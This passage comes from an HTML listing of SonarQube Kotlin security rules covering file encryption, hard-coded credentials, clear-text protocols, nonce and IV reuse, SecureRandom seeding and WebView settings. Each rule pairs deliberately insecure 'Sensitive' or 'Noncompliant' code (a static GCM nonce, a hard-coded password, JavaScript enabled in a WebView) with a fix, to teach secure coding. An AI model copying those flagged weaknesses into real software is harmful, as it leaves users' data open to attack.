<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to password-encrypt local files that contain sensitive information. The class <a href="https://developer.android.com/reference/androidx/security/crypto/EncryptedFile" rel="nofollow">EncryptedFile</a> can be used to easily encrypt files.</p>
<h2>Sensitive Code Example</h2>
<pre>
val targetFile &#61; File(activity.filesDir, &#34;data.txt&#34;)
targetFile.writeText(fileContent)  // Sensitive
</pre>
<h2>Compliant Solution</h2>
<pre>
val mainKey &#61; MasterKeys.getOrCreate(MasterKeys.AES256_GCM_SPEC)

val encryptedFile &#61; EncryptedFile.Builder(
    File(activity.filesDir, &#34;data.txt&#34;),
    activity,
    mainKey,
    EncryptedFile.FileEncryptionScheme.AES256_GCM_HKDF_4KB
).build()

encryptedFile.openFileOutput().apply {
    write(fileContent)
    flush()
    close()
}
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A04_2021-Insecure_Design/" rel="nofollow">OWASP Top 10 2021 Category A4</a> - Insecure Design </li><li> <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x07-v2-data_storage_and_privacy_requirements" rel="nofollow">Mobile AppSec
  Verification Standard</a> - Data Storage and Privacy Requirements </li><li> <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m2-insecure-data-storage" rel="nofollow">OWASP Mobile Top 10 2016 Category M2</a> - Insecure
  Data Storage </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration.html" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://cwe.mitre.org/data/definitions/311" rel="nofollow">MITRE, CWE-311</a> - Missing Encryption of Sensitive Data </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=kotlin:S2068">
              kotlin:S2068
            </a>
          </td>
          <td>
            <details>
              <p>Because it is easy to extract strings from an application source code or binary, credentials should not be hard-coded. This is particularly true
for applications that are distributed or that are open-source.</p>
<p>In the past, it has led to the following vulnerabilities:</p>
<ul><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2019-13466" rel="nofollow">CVE-2019-13466</a> </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2018-15389" rel="nofollow">CVE-2018-15389</a> </li></ul>
<p>Credentials should be stored outside of the code in a configuration file, a database, or a management service for secrets.</p>
<p>This rule flags instances of hard-coded credentials used in database and LDAP connections. It looks for hard-coded credentials in connection
strings, and for variable names that match any of the patterns from the provided list.</p>
<p>It’s recommended to customize the configuration of this rule with additional credential words such as &#34;oauthToken&#34;, &#34;secret&#34;, …​</p>
<h2>Ask Yourself Whether</h2>
<ul><li> Credentials allow access to a sensitive component like a database, a file storage, an API or a service. </li><li> Credentials are used in production environments. </li><li> Application re-distribution is required before updating the credentials. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> Store the credentials in a configuration file that is not pushed to the code repository. </li><li> Store the credentials in a database. </li><li> Use your cloud provider’s service for managing secrets. </li><li> If a password has been disclosed through the source code: change it. </li></ul>
<h2>Sensitive Code Example</h2>
<pre>
val params &#61; &#34;password&#61;xxxx&#34; // Sensitive
val writer &#61; OutputStreamWriter(getOutputStream())
writer.write(params)
writer.flush()
...
val password &#61; &#34;xxxx&#34; // Sensitive
...
</pre>
<h2>Compliant Solution</h2>
<pre>
val params &#61; &#34;password&#61;${retrievePassword()}&#34;
val writer &#61; OutputStreamWriter(getOutputStream())
writer.write(params)
writer.flush()
...
val password &#61; retrievePassword()
...
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/" rel="nofollow">OWASP Top 10 2021 Category A7</a> - Identification and
  Authentication Failures </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication" rel="nofollow">OWASP Top 10 2017 Category A2</a> - Broken Authentication
  </li><li> <a href="https://cwe.mitre.org/data/definitions/798" rel="nofollow">MITRE, CWE-798</a> - Use of Hard-coded Credentials </li><li> <a href="https://cwe.mitre.org/data/definitions/259" rel="nofollow">MITRE, CWE-259</a> - Use of Hard-coded Password </li><li> <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">SANS Top 25</a> - Porous Defenses </li><li> Derived from FindSecBugs rule <a href="https://h3xstream.github.io/find-sec-bugs/bugs.htm#HARD_CODE_PASSWORD" rel="nofollow">Hard Coded Password</a> </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=kotlin:S5332">
              kotlin:S5332
            </a>
          </td>
          <td>
            <details>
              <p>Clear-text protocols such as <code>ftp</code>, <code>telnet</code>, or <code>http</code> lack encryption of transported data, as well as the
capability to build an authenticated connection. It means that an attacker able to sniff traffic from the network can read, modify, or corrupt the
transported content. These protocols are not secure as they expose applications to an extensive range of risks:</p>
<ul><li> sensitive data exposure </li><li> traffic redirected to a malicious endpoint </li><li> malware-infected software update or installer </li><li> execution of client-side code </li><li> corruption of critical information </li></ul>
<p>Even in the context of isolated networks like offline environments or segmented cloud environments, the insider threat exists. Thus, attacks
involving communications being sniffed or tampered with can still happen.</p>
<p>For example, attackers could successfully compromise prior security layers by:</p>
<ul><li> bypassing isolation mechanisms </li><li> compromising a component of the network </li><li> getting the credentials of an internal IAM account (either from a service account or an actual person) </li></ul>
<p>In such cases, encrypting communications would decrease the chances of attackers to successfully leak data or steal credentials from other network
components. By layering various security practices (segmentation and encryption, for example), the application will follow the
<em>defense-in-depth</em> principle.</p>
<p>Note that using the <code>http</code> protocol is being deprecated by <a href="https://blog.mozilla.org/security/2015/04/30/deprecating-non-secure-http" rel="nofollow">major web browsers</a>.</p>
<p>In the past, it has led to the following vulnerabilities:</p>
<ul><li> <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-6169" rel="nofollow">CVE-2019-6169</a> </li><li> <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-12327" rel="nofollow">CVE-2019-12327</a> </li><li> <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-11065" rel="nofollow">CVE-2019-11065</a> </li></ul>
<h2>Ask Yourself Whether</h2>
<ul><li> Application data needs to be protected against falsifications or leaks when transiting over the network. </li><li> Application data transits over an untrusted network. </li><li> Compliance rules require the service to encrypt data in transit. </li><li> Your application renders web pages with a relaxed mixed content policy. </li><li> OS-level protections against clear-text traffic are deactivated. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> Make application data transit over a secure, authenticated and encrypted protocol like TLS or SSH. Here are a few alternatives to the most
  common clear-text protocols:
    <ul><li> Use <code>ssh</code> as an alternative to <code>telnet</code>. </li><li> Use <code>sftp</code>, <code>scp</code>, or <code>ftps</code> instead of <code>ftp</code>. </li><li> Use <code>https</code> instead of <code>http</code>. </li><li> Use <code>SMTP</code> over <code>SSL/TLS</code> or <code>SMTP</code> with <code>STARTTLS</code> instead of clear-text SMTP. </li></ul>  </li><li> Enable encryption of cloud components communications whenever it is possible. </li><li> Configure your application to block mixed content when rendering web pages. </li><li> If available, enforce OS-level deactivation of all clear-text traffic. </li></ul>
<p>It is recommended to secure all transport channels, even on local networks, as it can take a single non-secure connection to compromise an entire
application or system.</p>
<h2>Sensitive Code Example</h2>
<p>These clients from <a href="https://commons.apache.org/proper/commons-net/" rel="nofollow">Apache commons net</a> libraries are based on unencrypted protocols and
are not recommended:</p>
<pre>
val telnet &#61; TelnetClient(); // Sensitive

val ftpClient &#61; FTPClient(); // Sensitive

val smtpClient &#61; SMTPClient(); // Sensitive
</pre>
<p>Unencrypted HTTP connections, when using <a href="https://square.github.io/okhttp/https/" rel="nofollow">okhttp</a> library for instance, should be avoided:</p>
<pre>
val spec: ConnectionSpec &#61; ConnectionSpec.Builder(ConnectionSpec.CLEARTEXT) // Sensitive
  .build()
</pre>
<p>Android WebView can be configured to allow a secure origin to load content from any other origin, even if that origin is insecure (mixed
content):</p>
<pre>
import android.webkit.WebView

val webView: WebView &#61; findViewById(R.id.webview)
webView.getSettings().setMixedContentMode(MIXED_CONTENT_ALWAYS_ALLOW) // Sensitive
</pre>
<h2>Compliant Solution</h2>
<p>Use instead these clients from <a href="https://commons.apache.org/proper/commons-net/" rel="nofollow">Apache commons net</a> and <a href="http://www.jcraft.com/jsch/" rel="nofollow">JSch/ssh</a> library:</p>
<pre>
JSch jsch &#61; JSch();

if(implicit) {
  // implicit mode is considered deprecated but offer the same security than explicit mode
  val ftpsClient &#61; FTPSClient(true);
}
else {
  val ftpsClient &#61; FTPSClient();
}

if(implicit) {
  // implicit mode is considered deprecated but offer the same security than explicit mode
  val smtpsClient &#61; SMTPSClient(true);
}
else {
  val smtpsClient &#61; SMTPSClient();
  smtpsClient.connect(&#34;127.0.0.1&#34;, 25);
  if (smtpsClient.execTLS()) {
    // commands
  }
}
</pre>
<p>Perform HTTP encrypted connections, with <a href="https://square.github.io/okhttp/https/" rel="nofollow">okhttp</a> library for instance:</p>
<pre>
val spec: ConnectionSpec &#61;ConnectionSpec.Builder(ConnectionSpec.MODERN_TLS)
  .build()
</pre>
<p>The most secure mode for Android WebView is <code>MIXED_CONTENT_NEVER_ALLOW</code>:</p>
<pre>
import android.webkit.WebView

val webView: WebView &#61; findViewById(R.id.webview)
webView.getSettings().setMixedContentMode(MIXED_CONTENT_NEVER_ALLOW)
</pre>
<h2>Exceptions</h2>
<p>No issue is reported for the following cases because they are not considered sensitive:</p>
<ul><li> Insecure protocol scheme followed by loopback addresses like 127.0.0.1 or <code>localhost</code>. </li></ul>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x10-v5-network_communication_requirements" rel="nofollow">Mobile AppSec Verification
  Standard</a> - Network Communication Requirements </li><li> <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m3-insecure-communication" rel="nofollow">OWASP Mobile Top 10 2016 Category M3</a> - Insecure
  Communication </li><li> <a href="https://cwe.mitre.org/data/definitions/200" rel="nofollow">MITRE, CWE-200</a> - Exposure of Sensitive Information to an Unauthorized Actor </li><li> <a href="https://cwe.mitre.org/data/definitions/319" rel="nofollow">MITRE, CWE-319</a> - Cleartext Transmission of Sensitive Information </li><li> <a href="https://security.googleblog.com/2016/09/moving-towards-more-secure-web.html" rel="nofollow">Google, Moving towards more secure web</a> </li><li> <a href="https://blog.mozilla.org/security/2015/04/30/deprecating-non-secure-http/" rel="nofollow">Mozilla, Deprecating non secure http</a> </li><li> <a href="https://docs.aws.amazon.com/elasticloadbalancing/latest/application/load-balancer-listeners.html" rel="nofollow">AWS Documentation</a> - Listeners
  for your Application Load Balancers </li><li> <a href="https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-properties-kinesis-stream-streamencryption.html" rel="nofollow">AWS
  Documentation</a> - Stream Encryption </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=kotlin:S6432">
              kotlin:S6432
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>When encrypting data with Counter (CTR) derived block cipher modes of operation, it is essential not to reuse the same initialization vector (IV)
with a given key, such IV is called a &#34;nonce&#34; (number used only once). Galois/Counter (GCM) and Counter with Cipher Block Chaining-Message
Authentication Code (CCM) are both CTR-based modes of operation.</p>
<p>An attacker, who has knowledge of one plaintext (original content) and ciphertext (encrypted content) pair, is able to retrieve the corresponding
plaintext of any other ciphertext generated with the same IV and key. It also drastically decreases the key recovery computational complexity by
downgrading it to a simpler polynomial root-finding problem.</p>
<p>When using GCM, NIST recommends a 96 bit length nonce using a &#39;Deterministic&#39; approach or at least 96 bits using a &#39;Random Bit Generator (RBG)&#39;.
The &#39;Deterministic&#39; construction involves a counter, which increments per encryption process. The &#39;RBG&#39; construction, as the name suggests, generates
the nonce using a random bit generator. Collision probabilities (nonce-key pair reuse) using the &#39;RBG-based&#39; approach require a shorter key rotation
period, 2^32 maximum invocations per key.</p>
<h3>Noncompliant code example</h3>
<pre>
fun encrypt(key: ByteArray, ptxt: ByteArray) {
    val nonce: ByteArray &#61; &#34;7cVgr5cbdCZV&#34;.toByteArray() // The initialization vector is a static value

    val gcmSpec  &#61; GCMParameterSpec(128, nonce) // The initialization vector is configured here
    val skeySpec &#61; SecretKeySpec(key, &#34;AES&#34;)

    val cipher: Cipher &#61; Cipher.getInstance(&#34;AES/GCM/NoPadding&#34;)
    cipher.init(Cipher.ENCRYPT_MODE, skeySpec, gcmSpec) // Noncompliant
}
</pre>
<h3>Compliant solution</h3>
<pre>
fun encrypt(key: ByteArray, ptxt: ByteArray) {
    val random: SecureRandom &#61; SecureRandom()
    val nonce: ByteArray     &#61; ByteArray(12)
    random.nextBytes(nonce) // Random 96 bit IV

    val gcmSpec  &#61; GCMParameterSpec(128, nonce)
    val skeySpec &#61; SecretKeySpec(key, &#34;AES&#34;)

    val cipher: Cipher &#61; Cipher.getInstance(&#34;AES/GCM/NoPadding&#34;)
    cipher.init(Cipher.ENCRYPT_MODE, skeySpec, gcmSpec)
}
</pre>
<h2>Resources</h2>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data Exposure
  </li><li> <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x08-v3-cryptography_verification_requirements" rel="nofollow">Mobile AppSec
  Verification Standard</a> - Cryptography Requirements </li><li> <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography" rel="nofollow">OWASP Mobile Top 10 2016 Category M5</a> -
  Insufficient Cryptography </li><li> <a href="https://cwe.mitre.org/data/definitions/323" rel="nofollow">MITRE, CWE-323</a> - Reusing a Nonce, Key Pair in Encryption </li><li> <a href="https://nvlpubs.nist.gov/nistpubs/Legacy/SP/nistspecialpublication800-38a.pdf" rel="nofollow">NIST, SP-800-38A</a> - Recommendation for Block Cipher
  Modes of Operation </li><li> <a href="https://nvlpubs.nist.gov/nistpubs/Legacy/SP/nistspecialpublication800-38c.pdf" rel="nofollow">NIST, SP-800-38C</a> - Recommendation for Block Cipher
  Modes of Operation: The CCM Mode for Authentication and Confidentiality </li><li> <a href="https://nvlpubs.nist.gov/nistpubs/Legacy/SP/nistspecialpublication800-38d.pdf" rel="nofollow">NIST, SP-800-38D</a> - Recommendation for Block Cipher
  Modes of Operation: Galois/Counter Mode (GCM) and GMAC </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=kotlin:S3329">
              kotlin:S3329
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability exposes encrypted data to a number of attacks whose goal is to recover the plaintext.</p>
<h2>Why is this an issue?</h2>
<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communications in a variety of domains. They are used
for several important reasons:</p>
<ul><li> Confidentiality, privacy, and intellectual property protection </li><li> Security during transmission or on storage devices </li><li> Data integrity, general trust, and authentication </li></ul>
<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>
<ol><li> No encryption is unbreakable. </li><li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li></ol>
<p>In the mode Cipher Block Chaining (CBC), each block is used as cryptographic input for the next block. For this reason, the first block requires an
initialization vector (IV), also called a &#34;starting variable&#34; (SV).</p>
<p>If the same IV is used for multiple encryption sessions or messages, each new encryption of the same plaintext input would always produce the same
ciphertext output. This may allow an attacker to detect patterns in the ciphertext.</p>
<h3>What is the potential impact?</h3>
<p>After retrieving encrypted data and performing cryptographic attacks on it on a given timeframe, attackers can recover the plaintext that
encryption was supposed to protect.</p>
<p>Depending on the recovered data, the impact may vary.</p>
<p>Below are some real-world scenarios that illustrate the potential impact of an attacker exploiting the vulnerability.</p>
<h4>Additional attack surface</h4>
<p>By modifying the plaintext of the encrypted message, an attacker may be able to trigger additional vulnerabilities in the code. An attacker can
further exploit a system to obtain more information.<br /> Encrypted values are often considered trustworthy because it would not be possible for a
third party to modify them under normal circumstances.</p>
<h4>Breach of confidentiality and privacy</h4>
<p>When encrypted data contains personal or sensitive information, its retrieval by an attacker can lead to privacy violations, identity theft,
financial loss, reputational damage, or unauthorized access to confidential systems.</p>
<p>In this scenario, a company, its employees, users, and partners could be seriously affected.</p>
<p>The impact is twofold, as data breaches and exposure of encrypted data can undermine trust in the organization, as customers, clients and
stakeholders may lose confidence in the organization’s ability to protect their sensitive data.</p>
<h4>Legal and compliance issues</h4>
<p>In many industries and locations, there are legal and compliance requirements to protect sensitive data. If encrypted data is compromised and the
plaintext can be recovered, companies face legal consequences, penalties, or violations of privacy laws.</p>
<h2>How to fix it in Java Cryptographic Extension</h2>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
import java.nio.charset.StandardCharsets
import java.security.InvalidAlgorithmParameterException
import java.security.InvalidKeyException
import java.security.NoSuchAlgorithmException
import javax.crypto.Cipher
import javax.crypto.NoSuchPaddingException
import javax.crypto.spec.GCMParameterSpec
import javax.crypto.spec.SecretKeySpec

fun encrypt(key: String, plainText: String) {

    val randomBytes &#61; &#34;7cVgr5cbdCZVw5WY&#34;.toByteArray(StandardCharsets.UTF_8)

    val iv      &#61; GCMParameterSpec(128, randomBytes)
    val keySpec &#61; SecretKeySpec(key.toByteArray(StandardCharsets.UTF_8), &#34;AES&#34;)

    try {
        val cipher &#61; Cipher.getInstance(&#34;AES/CBC/NoPadding&#34;)
        cipher.init(Cipher.ENCRYPT_MODE, keySpec, iv) // Noncompliant

    } catch (e: NoSuchAlgorithmException) {
        // ...
    } catch (e: InvalidKeyException) {
        // ...
    } catch (e: NoSuchPaddingException) {
        // ...
    } catch (e: InvalidAlgorithmParameterException) {
        // ...
    }
}
</pre>
<h4>Compliant solution</h4>
<p>In this example, the code explicitly uses a number generator that is considered <strong>strong</strong>.</p>
<pre data-diff-id="1" data-diff-type="compliant">
import java.nio.charset.StandardCharsets
import java.security.SecureRandom
import java.security.InvalidAlgorithmParameterException
import java.security.InvalidKeyException
import java.security.NoSuchAlgorithmException
import javax.crypto.Cipher
import javax.crypto.NoSuchPaddingException
import javax.crypto.spec.GCMParameterSpec
import javax.crypto.spec.SecretKeySpec

fun encrypt(key: String, plainText: String) {

    val random      &#61; SecureRandom();
    val randomBytes &#61; ByteArray(16);
    random.nextBytes(randomBytes);

    val iv      &#61; GCMParameterSpec(128, randomBytes)
    val keySpec &#61; SecretKeySpec(key.toByteArray(StandardCharsets.UTF_8), &#34;AES&#34;)

    try {
        val cipher &#61; Cipher.getInstance(&#34;AES/CBC/NoPadding&#34;)
        cipher.init(Cipher.ENCRYPT_MODE, keySpec, iv)

    } catch (e: NoSuchAlgorithmException) {
        // ...
    } catch (e: InvalidKeyException) {
        // ...
    } catch (e: NoSuchPaddingException) {
        // ...
    } catch (e: InvalidAlgorithmParameterException) {
        // ...
    }
}
</pre>
<h3>How does this work?</h3>
<h4>Use unique IVs</h4>
<p>To ensure strong security, the initialization vectors for each encryption operation must be unique and random but they do not have to be
secret.</p>
<p>In the previous non-compliant example, the problem is not that the IV is hard-coded.<br /> It is that the same IV is used for multiple encryption
attempts.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data Exposure
  </li><li> <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x08-v3-cryptography_verification_requirements" rel="nofollow">Mobile AppSec
  Verification Standard</a> - Cryptography Requirements </li><li> <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography" rel="nofollow">OWASP Mobile Top 10 2016 Category M5</a> -
  Insufficient Cryptography </li><li> <a href="https://cwe.mitre.org/data/definitions/329" rel="nofollow">MITRE, CWE-329</a> - Not Using an Unpredictable IV with CBC Mode </li><li> <a href="https://nvlpubs.nist.gov/nistpubs/Legacy/SP/nistspecialpublication800-38a.pdf" rel="nofollow">NIST, SP-800-38A</a> - Recommendation for Block Cipher
  Modes of Operation </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=kotlin:S4347">
              kotlin:S4347
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>The <code>java.security.SecureRandom</code> class provides a strong random number generator (RNG) appropriate for cryptography. However, seeding it
with a constant or another predictable value will weaken it significantly. In general, it is much safer to rely on the seed provided by the
<code>SecureRandom</code> implementation.</p>
<p>This rule raises an issue when <code>SecureRandom.setSeed()</code> or <code>SecureRandom(byte[])</code> are called with a seed that is either one
of:</p>
<ul><li> a constant </li><li> the system time </li></ul>
<h3>Noncompliant code example</h3>
<pre>
val sr &#61; SecureRandom()
sr.setSeed(123456L) // Noncompliant
val v &#61; sr.nextInt()
</pre>
<pre>
val sr &#61; SecureRandom(&#34;abcdefghijklmnop&#34;.toByteArray(charset(&#34;us-ascii&#34;))) // Noncompliant
val v &#61; sr.nextInt()
</pre>
<h3>Compliant solution</h3>
<pre>
val sr &#61; SecureRandom()
val v &#61; sr.nextInt()
</pre>
<h2>Resources</h2>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://cwe.mitre.org/data/definitions/330" rel="nofollow">MITRE, CWE-330</a> - Use of Insufficiently Random Values </li><li> <a href="https://cwe.mitre.org/data/definitions/332" rel="nofollow">MITRE, CWE-332</a> - Insufficient Entropy in PRNG </li><li> <a href="https://cwe.mitre.org/data/definitions/336" rel="nofollow">MITRE, CWE-336</a> - Same Seed in Pseudo-Random Number Generator (PRNG) </li><li> <a href="https://cwe.mitre.org/data/definitions/337" rel="nofollow">MITRE, CWE-337</a> - Predictable Seed in Pseudo-Random Number Generator (PRNG) </li><li> <a href="https://wiki.sei.cmu.edu/confluence/display/java/MSC63-J.&#43;Ensure&#43;that&#43;SecureRandom&#43;is&#43;properly&#43;seeded" rel="nofollow">CERT, MSC63J.</a> - Ensure that
  SecureRandom is properly seeded </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=kotlin:S4507">
              kotlin:S4507
            </a>
          </td>
          <td>
            <details>
              <p>Development tools and frameworks usually have options to make debugging easier for developers. Although these features are useful during
development, they should never be enabled for applications deployed in production. Debug instructions or error messages can leak detailed information
about the system, like the application’s path or file names.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The code or configuration enabling the application debug features is deployed on production servers or distributed to end users. </li><li> The application runs by default with debug features activated. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Do not enable debugging features on applications distributed to end users.</p>
<h2>Sensitive Code Example</h2>
<p><a href="https://developer.android.com/reference/android/webkit/WebView#setWebContentsDebuggingEnabled%28boolean%29" rel="nofollow">WebView.setWebContentsDebuggingEnabled(true)</a>
for Android enables debugging support:</p>
<pre>
import android.webkit.WebView

WebView.setWebContentsDebuggingEnabled(true) // Sensitive
</pre>
<h2>Compliant Solution</h2>
<p><a href="https://developer.android.com/reference/android/webkit/WebView#setWebContentsDebuggingEnabled%28boolean%29" rel="nofollow">WebView.setWebContentsDebuggingEnabled(false)</a>
for Android disables debugging support:</p>
<pre>
import android.webkit.WebView

WebView.setWebContentsDebuggingEnabled(false)
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://cwe.mitre.org/data/definitions/489" rel="nofollow">MITRE, CWE-489</a> - Active Debug Code </li><li> <a href="https://cwe.mitre.org/data/definitions/215" rel="nofollow">MITRE, CWE-215</a> - Information Exposure Through Debug Information </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=kotlin:S6363">
              kotlin:S6363
            </a>
          </td>
          <td>
            <details>
              <p>WebViews can be used to display web content as part of a mobile application. A browser engine is used to render and display the content. Like a web
application, a mobile application that uses WebViews can be vulnerable to Cross-Site Scripting if untrusted code is rendered.</p>
<p>If malicious JavaScript code in a WebView is executed this can leak the contents of sensitive files when access to local files is enabled.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> No local files have to be accessed by the Webview. </li><li> The WebView contains untrusted data that could cause harm when rendered. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It is recommended to disable access to local files for WebViews unless it is necessary. In the case of a successful attack through a Cross-Site
Scripting vulnerability the attackers attack surface decreases drastically if no files can be read out.</p>
<h2>Sensitive Code Example</h2>
<pre>
import android.webkit.WebView

val webView: WebView &#61; findViewById(R.id.webview)
webView.getSettings().setAllowContentAccess(true) // Sensitive
webView.getSettings().setAllowFileAccess(true) // Sensitive
</pre>
<h2>Compliant Solution</h2>
<pre>
import android.webkit.WebView

val webView: WebView &#61; findViewById(R.id.webview)
webView.getSettings().setAllowContentAccess(false)
webView.getSettings().setAllowFileAccess(false)
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A03_2021-Injection/" rel="nofollow">OWASP Top 10 2021 Category A3</a> - Injection </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration.html" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_%28XSS%29" rel="nofollow">OWASP Top 10 2017 Category A7</a> - Cross-Site
  Scripting (XSS) </li><li> <a href="https://cwe.mitre.org/data/definitions/79" rel="nofollow">MITRE, CWE-79</a> - Improper Neutralization of Input During Web Page Generation
  (&#39;Cross-site Scripting&#39;) </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=kotlin:S6362">
              kotlin:S6362
            </a>
          </td>
          <td>
            <details>
              <p>WebViews can be used to display web content as part of a mobile application. A browser engine is used to render and display the content. Like a web
application, a mobile application that uses WebViews can be vulnerable to Cross-Site Scripting if untrusted code is rendered. In the context of a
WebView, JavaScript code can exfiltrate local files that might be sensitive or even worse, access exposed functions of the application that can result
in more severe vulnerabilities such as code injection. Thus JavaScript support should not be enabled for WebViews unless it is absolutely necessary
and the authenticity of the web resources can be guaranteed.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The WebWiew only renders static web content that does not require JavaScript code to be executed. </li><li> The WebView contains untrusted data that could cause harm when rendered. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It is recommended to disable JavaScript support for WebViews unless it is necessary to execute JavaScript code. Only trusted pages should be
rendered.</p>
<h2>Sensitive Code Example</h2>
<pre>
import android.webkit.WebView

val webView: WebView &#61; findViewById(R.id.webview)
webView.getSettings().setJavaScriptEnabled(true) // Sensitive
</pre>
<h2>Compliant Solution</h2>
<pre>
import android.webkit.WebView

val webView: WebView &#61; findViewById(R.id.webview)
webView.getSettings().setJavaScriptEnabled(false)
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A03_2021-Injection/" rel="nofollow">OWASP Top 10 2021 Category A3</a> - Injection </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration.html" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_%28XSS%29" rel="nofollow">OWASP Top 10 2017 Category A7</a> - Cross-Site
  Scripting (XSS) </li><li> <a href="https://cwe.mitre.org/data/definitions/79" rel="nofollow">MITRE, CWE-79</a> - Improper Neutralization of Input During Web Page Generation
  (&#39;Cross-site Scripting&#39;) </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=kotlin:S5322">
              kotlin:S5322
            </a>
          </td>
          <td>
            <details>
              <p>Android applications can receive broadcasts from the system or other applications. Receiving intents is security-sensitive. For example, it has led
in the past to the following vulnerabilities:</p>
